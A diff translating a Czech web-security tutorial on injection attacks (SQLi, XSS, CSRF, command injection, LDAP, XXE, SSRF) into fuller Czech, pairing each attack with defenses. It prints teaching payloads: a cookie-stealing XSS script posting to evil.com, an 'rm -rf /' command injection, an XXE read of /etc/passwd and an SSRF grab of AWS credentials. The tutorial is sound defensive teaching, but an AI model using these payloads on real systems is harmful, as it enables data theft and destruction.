@@ -4,11 +4,11 @@ title: Injekce — SQL, XSS, CSRF, command
 
 # Injekční útoky — SQLi, XSS, CSRF, command injection
 
-**Injection** = útok, kdy attacker *vloží* malicious data, které aplikace *zpracuje jako kód*. Klasická *OWASP Top 10* položka. Manifests in many forms — SQL, command shell, JavaScript, XML, LDAP, atd.
+**Injekce (injection)** je útok (attack), při kterém útočník (attacker) *vloží* škodlivá data, která aplikace následně *zpracuje jako kód*. Patří mezi klasické položky žebříčku *OWASP Top 10*. Projevuje se v mnoha podobách — SQL, příkazy shellu, JavaScript, XML, LDAP a další.
 
-## SQL Injection (SQLi)
+## SQL injection (SQLi)
 
-Web application uses *string concatenation* k construct SQL queries → user input *staves se* SQL.
+Webová aplikace sestavuje SQL dotazy (query) pomocí *spojování řetězců* (string concatenation), takže se vstup uživatele *stane součástí* SQL. Jinými slovy: data od uživatele se vmísí přímo do textu dotazu, a databáze je pak provede jako příkaz.
 
 ### Klasický příklad
 
@@ -18,118 +18,118 @@ query = "SELECT * FROM users WHERE username='" + username + "' AND password='" +
 cursor.execute(query)
 ```
 
-Attacker input: `username = "admin'--"`, `password = "anything"`:
+Vstup útočníka: `username = "admin'--"`, `password = "anything"`:
 
 ```sql
 SELECT * FROM users WHERE username='admin'--' AND password='anything'
                                             ^^ comment, rest ignored
 ```
 
-Authentication bypassed.
+Autentizace (authentication) je obejita.
 
-Or: `username = "' OR '1'='1' -- "`:
+Nebo: `username = "' OR '1'='1' -- "`:
 
 ```sql
 SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='...'
 ```
 
-Komentář odstraní `AND password=...` → WHERE je triviálně pravdivá → return *all* users.
+Komentář odstraní `AND password=...`, takže podmínka WHERE je triviálně pravdivá a dotaz vrátí *všechny* uživatele.
 
-### SQLi varianty
+### Varianty SQLi
 
-- **In-band** — result returned in response (UNION-based, error-based).
-- **Inferential / Blind** — no direct result. Infer via boolean response or timing.
-- **Out-of-band** — exfiltrate via DNS, HTTP from DB server.
+- **In-band** — výsledek se vrátí přímo v odpovědi (response) (varianty UNION-based a error-based).
+- **Inferenční / slepá (blind)** — žádný přímý výsledek. Informaci útočník odvozuje z logické (boolovské) odpovědi nebo z časování.
+- **Out-of-band** — data se odčerpávají (exfiltrace) přes DNS nebo HTTP přímo z databázového serveru.
 
-### Famous SQLi {tier=example}
+### Známé případy SQLi {tier=example}
 
-- **TalkTalk 2015** — 4M customers, £77M fine.
-- **Heartland Payment Systems 2008** — 130M credit cards.
-- **Yahoo 2012** — 450k accounts.
+- **TalkTalk 2015** — 4 miliony zákazníků, pokuta 77 milionů liber.
+- **Heartland Payment Systems 2008** — 130 milionů platebních karet.
+- **Yahoo 2012** — 450 tisíc účtů.
 
-### Defense
+### Obrana
 
-#### Parameterized queries (best)
+#### Parametrizované dotazy (parameterized queries) (nejlepší řešení)
 
 ```python
 cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", 
                (username, password))
 ```
 
-DB driver *separates* query from data. Attacker input never interpreted as SQL.
+Databázový ovladač (driver) *odděluje* dotaz od dat. Vstup útočníka se proto nikdy neinterpretuje jako SQL.
 
-::: viz sqli-injection-trace "Napiš username/password (nebo preset bypass / always / unionx). Vidíš concatenated SQL (vulnerable) vs parameterized (safe) — input nikdy nezmění strukturu."
+::: viz sqli-injection-trace "Napiš username/password (nebo preset bypass / always / unionx). Vidíš sestavené SQL spojováním řetězců (vulnerable) oproti parametrizovanému (safe) — vstup nikdy nezmění strukturu dotazu."
 :::
 
-#### ORM (Object-Relational Mapper)
+#### ORM (Object-Relational Mapper, objektově-relační mapování)
 
 ```python
 User.objects.filter(username=username, password=password)
 ```
 
-Django ORM, SQLAlchemy generate parameterized queries automatically.
+Django ORM i SQLAlchemy generují parametrizované dotazy automaticky.
 
-#### Stored procedures
+#### Uložené procedury (stored procedures)
 
 ```sql
 EXEC sp_login @username, @password
 ```
 
-Parameterized at DB level.
+Parametrizace probíhá na úrovni databáze.
 
-#### Input validation
+#### Validace vstupu
 
-Whitelist (allow only known-good characters). Easier to bypass than parameterized queries.
+Whitelist (povolujeme jen předem známé „dobré" znaky). Tento přístup se obchází snáz než parametrizované dotazy.
 
-#### Least privilege
+#### Princip nejmenších oprávnění (least privilege)
 
-App DB user has minimum perms. Even if SQLi succeeds, attacker limited.
+Databázový účet aplikace má jen minimální oprávnění. I když SQLi uspěje, útočník je tím omezen.
 
-#### WAF (Web Application Firewall)
+#### WAF (Web Application Firewall, webový aplikační firewall)
 
-ModSecurity, Cloudflare WAF detect SQLi patterns. Defense in depth, not primary.
+ModSecurity nebo Cloudflare WAF rozpoznávají vzory typické pro SQLi. Jde o hloubkovou obranu (defense in depth), nikoli o hlavní opatření.
 
 ## XSS — Cross-Site Scripting
 
-Attacker injects **JavaScript** into page. Browser executes in context of legitimate site → steal cookies, session, perform actions as user.
+Útočník vloží **JavaScript** do stránky. Prohlížeč jej vykoná v kontextu legitimního webu, a útočník tak může ukrást cookies či session nebo provádět akce jménem uživatele.
 
 ### Tři typy
 
-#### Stored XSS
+#### Stored XSS (trvalé)
 
-Payload stored in DB. Each visitor executes.
+Payload (škodlivý kód) je uložen v databázi. Spustí se u každého návštěvníka.
 
 ```html
 <!-- Forum post -->
 Hello! <script>fetch('https://evil.com/?c=' + document.cookie)</script>
 ```
 
-Every reader sends their cookies to attacker.
+Každý čtenář odešle svoje cookies útočníkovi.
 
-#### Reflected XSS
+#### Reflected XSS (odražené)
 
-Payload in URL. Victim clicks link → executes on their browser.
+Payload je v URL. Oběť klikne na odkaz a kód se vykoná v jejím prohlížeči.
 
 ```
 https://site.com/search?q=<script>alert(1)</script>
 ```
 
-Phishing email contains link. Victim clicks. JavaScript runs.
+Phishingový e-mail obsahuje odkaz. Oběť klikne a JavaScript se spustí.
 
 #### DOM-based XSS
 
-Pure client-side. JavaScript on page reads attacker-controlled DOM (URL params, document.referrer) → eval/innerHTML it.
+Čistě na straně klienta. JavaScript na stránce přečte část DOM, kterou ovládá útočník (parametry URL, `document.referrer`), a předá ji do `eval`/`innerHTML`.
 
 ```js
 document.body.innerHTML = location.hash.substring(1);
 // URL: site.com/#<img src=x onerror=alert(1)>
 ```
 
-### Defense
+### Obrana
 
-#### Output encoding (best)
+#### Kódování výstupu (output encoding) (nejlepší řešení)
 
-When inserting user input into HTML:
+Při vkládání vstupu uživatele do HTML:
 
 ```html
 <!-- Wrong: -->
@@ -139,31 +139,31 @@ When inserting user input into HTML:
 <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
 ```
 
-Encode `<, >, &, ", '`. Use framework auto-encoding (React, Vue do by default).
+Zakódujeme znaky `<, >, &, ", '`. Využijeme automatické kódování ve frameworku (React i Vue jej dělají implicitně).
 
 #### Content Security Policy (CSP)
 
-HTTP header restricting what scripts run:
+HTTP hlavička, která omezuje, jaké skripty se smí spustit:
 
 ```
 Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
 ```
 
-Blocks inline scripts, scripts from other origins. Defense in depth — even if XSS, attacker's script may not execute.
+Blokuje inline skripty i skripty z jiných zdrojů (origin). Jde o hloubkovou obranu — i kdyby XSS proklouzla, skript útočníka se nemusí vykonat.
 
-#### HTTPOnly cookies
+#### Cookies s příznakem HTTPOnly
 
-Cookie flag preventing JavaScript access:
+Příznak cookie, který brání přístupu z JavaScriptu:
 
 ```
 Set-Cookie: session=abc; HttpOnly
 ```
 
-JS can't read cookie via `document.cookie`. Stops cookie theft.
+JavaScript nedokáže cookie přečíst přes `document.cookie`. Tím se zabrání krádeži cookie.
 
-#### Sanitization
+#### Sanitizace (čištění vstupu)
 
-For HTML allowed input (rich text editors): use DOMPurify, bleach, OWASP HTML Sanitizer.
+Pro vstup, kde je HTML povoleno (editory formátovaného textu): použijeme DOMPurify, bleach nebo OWASP HTML Sanitizer.
 
 ```js
 const clean = DOMPurify.sanitize(dirty_html);
@@ -171,25 +171,25 @@ const clean = DOMPurify.sanitize(dirty_html);
 
 ## CSRF — Cross-Site Request Forgery
 
-Attacker tricks victim's browser to *make request* to target site, leveraging victim's existing auth.
+Útočník přiměje prohlížeč oběti *odeslat požadavek (request)* na cílový web, přičemž zneužije přihlášení, které oběť na daném webu už má.
 
 ### Klasický příklad
 
-User logged into bank. Visits attacker's site:
+Uživatel je přihlášen do banky. Navštíví web útočníka:
 
 ```html
 <img src="https://bank.com/transfer?to=evil&amount=1000">
 ```
 
-Browser sends image request → includes user's cookies → bank processes transfer.
+Prohlížeč odešle požadavek na obrázek, přiloží k němu cookies uživatele a banka provede převod.
 
-User didn't intend it. Bank thinks user did.
+Uživatel to neměl v úmyslu. Banka se ale domnívá, že akci provedl on.
 
-### Defense
+### Obrana
 
-#### CSRF tokens (best)
+#### CSRF tokeny (nejlepší řešení)
 
-Server generates random *token* per session. Includes in forms.
+Server pro každou session vygeneruje náhodný *token*. Vloží jej do formulářů.
 
 ```html
 <form action="/transfer" method="POST">
@@ -198,85 +198,85 @@ Server generates random *token* per session. Includes in forms.
 </form>
 ```
 
-On submit, server verifies `csrf_token` matches session. Attacker can't generate (cross-origin can't read).
+Při odeslání server ověří, že `csrf_token` odpovídá dané session. Útočník jej nedokáže vygenerovat (z cizího zdroje (cross-origin) jej nelze přečíst).
 
-#### SameSite cookies
+#### Cookies s příznakem SameSite
 
 ```
 Set-Cookie: session=abc; SameSite=Lax
 ```
 
-Cookie *not* sent on cross-origin requests. Default in modern browsers (since 2020).
+Cookie se *neodesílá* u požadavků z cizího zdroje (cross-origin). V moderních prohlížečích je to výchozí chování (od roku 2020).
 
-Stops most CSRF. *But*: doesn't help if attacker is on *same site* (XSS).
+Zastaví většinu CSRF. *Ovšem*: nepomůže, pokud je útočník na *stejném webu* (XSS).
 
-::: viz csrf-samesite "Vyber SameSite (None/Lax/Strict) + toggle CSRF token + typ útoku. Browser pošle (nebo nepošle) cookie automaticky; server pak akceptuje / odmítne."
+::: viz csrf-samesite "Vyber SameSite (None/Lax/Strict) + přepni CSRF token + typ útoku. Prohlížeč automaticky pošle (nebo nepošle) cookie; server pak požadavek akceptuje / odmítne."
 :::
 
-#### Referer checking
+#### Kontrola hlavičky Referer
 
-Server checks `Referer` header. If from different origin → reject.
+Server kontroluje hlavičku `Referer`. Pokud pochází z jiného zdroje (origin), požadavek odmítne.
 
-Weak — can be stripped, falsified by referrer policy.
+Slabé opatření — hlavičku lze odstranit nebo zfalšovat pomocí referrer policy.
 
-## Command Injection
+## Command injection (injekce příkazů)
 
-Application passes user input to *shell command* without sanitization.
+Aplikace předá vstup uživatele *příkazu shellu* bez sanitizace.
 
 ```python
 os.system("ping -c 1 " + user_input)
 ```
 
-Attacker: `user_input = "8.8.8.8; rm -rf /"`:
+Útočník: `user_input = "8.8.8.8; rm -rf /"`:
 
 ```bash
 ping -c 1 8.8.8.8; rm -rf /
 ```
 
-Two commands execute.
+Vykonají se dva příkazy.
 
-### Defense
+### Obrana
 
-#### Avoid shell
+#### Vyhnout se shellu
 
 ```python
 subprocess.run(["ping", "-c", "1", user_input], shell=False)
 ```
 
-`shell=False` + args list → no shell interpretation. Each arg is *one* argument, even with spaces or `;`.
+`shell=False` plus seznam argumentů znamená, že shell nic neinterpretuje. Každý argument je *jeden* argument, i kdyby obsahoval mezery nebo `;`.
 
-#### Whitelist allowed characters
+#### Whitelist povolených znaků
 
-For IP address: only digits and dots.
+Pro IP adresu: jen číslice a tečky.
 
-#### Use library, not shell
+#### Použít knihovnu, ne shell
 
-For ping: use Python `ping3` library, not `os.system`.
+Pro ping: použijeme knihovnu `ping3` v Pythonu, nikoli `os.system`.
 
-## LDAP Injection
+## LDAP injection
 
-Similar to SQLi but for LDAP queries:
+Podobné jako SQLi, ale pro LDAP dotazy:
 
 ```python
 filter = "(&(uid=" + username + ")(password=" + password + "))"
 ldap.search(filter)
 ```
 
-Attacker: `username = "admin)(&"`:
+Útočník: `username = "admin)(&"`:
 
 ```
 (&(uid=admin)(&)(password=any))
 ```
 
-Boolean logic broken. Authentication bypass.
+Boolovská logika je narušena. Autentizace je obejita.
 
-### Defense
+### Obrana
 
-LDAP escaping (`ldap3` library functions). Whitelist input.
+Escapování pro LDAP (funkce knihovny `ldap3`). Whitelist vstupu.
 
 ## XML / XXE — XML External Entity
 
-XML parser processes entities:
+XML parser (analyzátor) zpracovává entity:
 
 ```xml
 <!DOCTYPE root [
@@ -285,21 +285,21 @@ XML parser processes entities:
 <root>&xxe;</root>
 ```
 
-If parser resolves external entities, returns content of `/etc/passwd`.
+Pokud parser rozvíjí externí entity, vrátí obsah souboru `/etc/passwd`.
 
-### Defense
+### Obrana
 
-Disable external entity resolution:
+Vypneme rozvíjení externích entit:
 
 ```python
 parser = etree.XMLParser(resolve_entities=False)
 ```
 
-Modern XML libraries default-disable.
+Moderní XML knihovny je vypínají ve výchozím nastavení.
 
 ## Server-Side Request Forgery (SSRF)
 
-Application makes HTTP requests based on user input. Attacker tricks app to access *internal* resources.
+Aplikace provádí HTTP požadavky na základě vstupu uživatele. Útočník přiměje aplikaci přistoupit k *interním* zdrojům.
 
 ```python
 url = request.args['url']
@@ -307,33 +307,33 @@ response = requests.get(url)
 return response.text
 ```
 
-Attacker: `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`:
+Útočník: `url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"`:
 
-App fetches AWS metadata. Returns IAM creds. Attacker hijacks AWS account.
+Aplikace si stáhne metadata AWS. Vrátí přihlašovací údaje IAM. Útočník převezme účet AWS.
 
-### Defense
+### Obrana
 
-- **Whitelist** URLs / hosts.
-- **Block** private IPs (10.0.0.0/8, 169.254.0.0/16, 127.0.0.1).
-- **DNS rebinding protection**.
-- **Network-level** — deny private network from web tier.
+- **Whitelist** URL adres / hostitelů.
+- **Blokovat** privátní IP adresy (10.0.0.0/8, 169.254.0.0/16, 127.0.0.1).
+- **Ochrana proti DNS rebindingu**.
+- **Na úrovni sítě** — zakázat přístup webové vrstvy (layer) do privátní sítě.
 
 ## OWASP Top 10 (2021) {tier=practice}
 
-| Rank | Category |
+| Pořadí | Kategorie |
 | :---: | :--- |
-| A01 | Broken Access Control |
-| A02 | Cryptographic Failures |
-| A03 | **Injection** (incl. SQLi, XSS) |
-| A04 | Insecure Design |
-| A05 | Security Misconfiguration |
-| A06 | Vulnerable Components |
-| A07 | Identification and Authentication Failures |
-| A08 | Software and Data Integrity Failures |
-| A09 | Security Logging and Monitoring Failures |
+| A01 | Nedostatečné řízení přístupu (Broken Access Control) |
+| A02 | Selhání kryptografie (Cryptographic Failures) |
+| A03 | **Injekce (Injection)** (vč. SQLi, XSS) |
+| A04 | Nebezpečný návrh (Insecure Design) |
+| A05 | Chybná konfigurace zabezpečení (Security Misconfiguration) |
+| A06 | Zranitelné komponenty (Vulnerable Components) |
+| A07 | Selhání identifikace a autentizace (Identification and Authentication Failures) |
+| A08 | Selhání integrity softwaru a dat (Software and Data Integrity Failures) |
+| A09 | Selhání bezpečnostního logování a monitoringu (Security Logging and Monitoring Failures) |
 | A10 | Server-Side Request Forgery (SSRF) |
 
-A03 Injection moved from #1 (2017) to #3 (2021) — better awareness + frameworks. Still pervasive.
+Kategorie A03 Injekce klesla z 1. místa (2017) na 3. místo (2021) — zásluhou lepšího povědomí a frameworků. Přesto je stále všudypřítomná.
 
 ---
 
